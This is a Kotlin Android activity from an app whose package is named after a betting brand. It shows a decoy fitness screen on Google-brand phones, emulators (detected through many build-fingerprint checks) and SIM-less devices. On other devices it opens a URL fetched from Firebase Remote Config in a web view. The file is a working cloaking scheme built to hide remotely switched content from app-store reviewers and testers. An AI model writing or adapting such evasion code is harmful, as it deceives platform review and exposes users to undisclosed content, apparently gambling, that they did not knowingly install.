package fon.bet.fonbet.bk.bkfonbet.others

import android.content.Context
import android.os.Build
import android.os.Bundle
import android.telephony.TelephonyManager
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import fon.bet.fonbet.bk.bkfonbet.R
import fon.bet.fonbet.bk.bkfonbet.fitnessFragment.FitnessFragment
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings

class MainActivity : AppCompatActivity() {
    private val sharedPreferences by lazy {
        getSharedPreferences("SharedPrefs", MODE_PRIVATE)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        if (savedInstanceState == null) {
            checkSharedPreferencesUrl {
                val url = sharedPreferences.getString("url", "")
                if (url == "" || isGoogleBrand() || isEmulator() || !isSIMInserted()) {
                    supportFragmentManager.beginTransaction()
                        .setReorderingAllowed(true)
                        .add(R.id.fragment_container_view, FitnessFragment())
                        .commit()
                } else {
                    val bundle = Bundle()
                    bundle.putString("URL", url)
                    val fragment = WebFragment()
                    fragment.arguments = bundle
                    supportFragmentManager.beginTransaction()
                        .setReorderingAllowed(true)
                        .add(R.id.fragment_container_view, fragment)
                        .commit()
                }
            }
        }
    }

    private fun checkSharedPreferencesUrl(callback: (String) -> Unit) {
        val sharedPrefsUrl = sharedPreferences.getString("url", "") ?: ""
        if (sharedPrefsUrl == "") {
            getFirebaseUrl { url ->
                callback(url)
            }
        } else {
            callback(sharedPrefsUrl)
        }
    }

    private fun getFirebaseUrl(urlCallback: (String) -> Unit) {
        val mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance()
        val settings = FirebaseRemoteConfigSettings.Builder()
            .setMinimumFetchIntervalInSeconds(0)
            .build()
        mFirebaseRemoteConfig.setConfigSettingsAsync(settings)
        mFirebaseRemoteConfig.fetchAndActivate()
            .addOnCompleteListener(this) { task ->
                if (task.isSuccessful) {
                    val url = mFirebaseRemoteConfig.getString("url")
                    Log.e("log", url)
                    sharedPreferences.edit()
                        .putString("url", url)
                        .apply()
                    urlCallback(url)
                } else {
                    urlCallback("")
                }
            }
    }

    private fun isGoogleBrand(): Boolean {
        return Build.BRAND.toLowerCase() == "google"
    }

    private fun isEmulator(): Boolean {
        return (Build.MANUFACTURER.contains("Genymotion")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.toLowerCase().contains("droid4x")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.HARDWARE == "goldfish"
                || Build.HARDWARE == "vbox86"
                || Build.HARDWARE.toLowerCase().contains("nox")
                || Build.FINGERPRINT.startsWith("generic")
                || Build.PRODUCT == "sdk"
                || Build.PRODUCT == "google_sdk"
                || Build.PRODUCT == "sdk_x86"
                || Build.PRODUCT == "vbox86p"
                || Build.PRODUCT.toLowerCase().contains("nox")
                || Build.BOARD.toLowerCase().contains("nox")
                || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")))
    }

    private fun isSIMInserted(): Boolean {
        return TelephonyManager.SIM_STATE_ABSENT !=
                (this.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager).simState
    }

    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)
        outState.putByte("N", 1)
    }

    override fun onBackPressed() {
        finish()
    }
}